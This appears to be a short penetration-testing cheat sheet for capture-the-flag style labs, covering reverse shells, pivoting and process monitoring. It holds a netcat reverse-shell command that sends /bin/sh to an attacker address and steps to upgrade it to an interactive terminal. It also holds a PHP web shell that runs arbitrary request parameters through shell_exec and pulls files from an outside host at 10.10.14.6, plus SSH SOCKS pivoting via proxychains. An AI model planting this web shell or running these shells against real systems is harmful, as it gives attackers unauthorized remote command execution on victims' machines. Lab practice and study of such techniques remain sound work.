# Pivoting
Example: https://www.youtube.com/watch?v=HQkDL-xh7es

# Shells

## Prettifying reverse nc shells
Example: Ippsec videos -> Bank, Apocalyst

On the attacker:
  nc -lvnp <attacker_port>
On the victim:
  nc -c /bin/sh <attacker_ip> <attacker_port>
In the shell:
  python -c 'import pty;pty.spawn("/bin/bash")'
  Ctrl+Z to background the nc session
  stty raw -echo
  fg # to resume the session

Making vim's size prettier:
  On the attacker:
    stty size
      48 168
  On the victim:
    stty rows 48 cols 168

## PHP shell
```php
$phpCode = <<<'EOD'
<?php
	if (isset($_REQUEST['fupload'])) {
		file_put_contents($_REQUEST['fupload'], file_get_contents("http://10.10.14.6:8090/" . $_REQUEST['fupload']));
	};
	if (isset($_REQUEST['fexec'])) {
		echo "<pre>" . shell_exec($_REQUEST['fexec']) . "</pre>";
	};
?>
EOD;
```

## Process monitor in linux

```
#!/bin/bash

IFS=$'\n'

old_process=$(ps -eo command)

while true; do
  new_process=$(ps -eo command)
  diff <(echo "$old_process") <(echo $"new_process")
  sleep 1
  old_process=$new_process
done
```


# Misc

# This command generates dynamic socks proxy through ssh connection
ssh -D1080 <server_ip>
# Now if I connect to 127.0.0.1:1080, request will go through ssh to the server
vi /etc/proxychains.conf
  socks5 127.0.0.1 1080
proxychains curl <another_server>
